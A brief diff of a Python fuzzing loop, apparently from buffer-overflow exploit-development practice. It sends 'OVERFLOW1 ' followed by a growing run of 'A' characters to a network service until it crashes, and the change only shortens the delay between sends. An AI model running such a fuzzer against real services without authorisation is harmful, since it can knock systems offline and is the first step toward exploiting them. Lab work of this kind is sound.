@@ -11,7 +11,7 @@ while True:
         	print("Sending: %s" % str(len(buffer)))
                 s.send(("OVERFLOW1 " + buffer))
                 s.close()
-                sleep(6)
+                sleep(4)
                 buffer = buffer + "A" * 100
 
         except:
